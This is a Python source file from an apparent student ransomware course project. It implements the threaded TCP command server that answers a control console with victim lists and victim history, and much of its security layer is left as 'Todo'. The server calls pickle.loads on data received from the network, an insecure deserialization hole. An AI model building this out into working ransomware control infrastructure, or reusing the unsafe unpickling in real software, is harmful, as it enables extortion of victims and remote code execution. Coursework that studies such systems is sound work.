#!/usr/bin/python
# --------------------------------------------
import binascii
# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : network

# --------------------------------------------
# Importations
# --------------------------------------------
import socket
import threading
from _thread import start_new_thread

import configgetter as config
import security
import json
import utile.data as udata
import message
import pickle

# --------------------------------------------
# Classes & Functions
# --------------------------------------------

print_lock = threading.Lock()


class server_tcp(object):


    def __init__(self, ip, port):
        """ Création des paramètres pour le serveur afin de pouvoir initialiser la connexion
        """
        self.ip = ip
        self.port = port

    def send_data(self, c, message, HEADERSIZE=10):
        """
        Créer un header pour la connexion TCP afin de savoir de où à où lire
        """
        serialized_payload = pickle.dumps(message)
        c.sendall(bytes(f"{len(serialized_payload):<{HEADERSIZE}}", 'utf-8'))
        c.sendall(serialized_payload)

    def receive_data(self, c, HEADERSIZE=10):
        data_size = int(c.recv(HEADERSIZE)[0:HEADERSIZE])
        received_payload = b""
        reamining_payload_size = data_size
        while reamining_payload_size != 0:
            received_payload += c.recv(reamining_payload_size)
            reamining_payload_size = data_size - len(received_payload)
        payload = pickle.loads(received_payload)
        return payload


    def start_server(self):
        """
        Démarrage du serveur et maintient de celui-ci + gestion des 'commandes'
        """
        # Création de la socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(f'$ Server started ! Waiting for clients...')
        try:
            # Debug & Prevent crash
            s.bind((self.ip, self.port))
        except socket.error as error:
            print(str(error))
        # Max 10 clients
        s.listen(10)
        while True:
            # On accepte les connexions
            conn, addr = s.accept()
            # Ok
            print_lock.acquire()
            print(f'[+] New TCP Connexion from ' + str(addr[0]) + ":" + str(addr[1]))
            # Nouvelle connexion détectée : On créé un thread pour celle-ci
            start_new_thread(self.threaded, (conn, addr))
        # Implémentation sécurité : AES
        # conn.send(bytes(str(key), 'utf-8'))
        # conn.send(bytes(str(nonce), 'utf-8'))
        # conn.send(bytes(str(tag), 'utf-8'))
        # Fermeture de la connexion
        self.s.close()

    def gestion_msg(self, c, msg):
        """
        Système de gestion des commandes envoyées par la console de contrôle
        """
        if msg == message.list_victim_req():
            # On va interroger le serveur SQL depuis le serveur frontale pour des raisons
            # De sécurité...
            # On envoie la liste
            return udata.list_victim()
        elif "HIST_REQ" in msg:
            # On demande un ID en particulier pour une recherche d'historique
            # On envoie l'historique
            return udata.history_req(msg[-3:-2])
        elif msg == '3':
            # C'est à faire
            return "Todo3"
        elif msg == message.close_connexion():
            return 'Thanks you, good bye.'

    def threaded(self, c, sc):
        """
        Système de création de Threads..
        """
        print('New thread started')
        print('[SecurityLayerAES]Generating Security Parameters...')
        # On initialise un protocole de sécurité AES par thread pour
        # Sécurisé de manière différente (différents nonce, key, authtag)
        # chaques connexion pour éviter de pouvoir spoof sur une autre connexion
        # tcp avec des keys d'autres connexions...
        self.send_data(c, 'Todo')
        #c.send(bytes(str(binascii.hexlify(sec.showValues())), 'utf-8'))
        # Todo: Mettre en place le cryptage
        while True:
            data = self.receive_data(c)
            if not data:
                print(sc[0] + ':' + str(sc[1]) + ' >> connexion closed.')
                # Suppression du thread + Reset connexion TCP --> Suppression Thread = Force close de la connexion
                print_lock.release()
                break
            # On print l'ip de la connexion et sa demande
            print(str(sc[0] + ':' + str(sc[1]) + " >> " + str(data)))
            # On construit une réponse grâce à la méthode gestion message
            rs = self.gestion_msg(c, data)
            # @Todo: Build header & send it before msg
            #r = sec.encrypt(pickle.dumps(rs))
            # On l'envoie
            self.send_data(c, rs)
        # On ferme la connexion du client lors de la fin de connexion
        c.close()


# On initialise l'objet serveur avec les paramètres ip et port contenu dans le fichier config
# Pour éviter le hard-coding et des modifications plus aisée...
srv = server_tcp(config.get_ip("../config.json"), config.get_port("../config.json"))
# On démarre le serveur
srv.start_server()
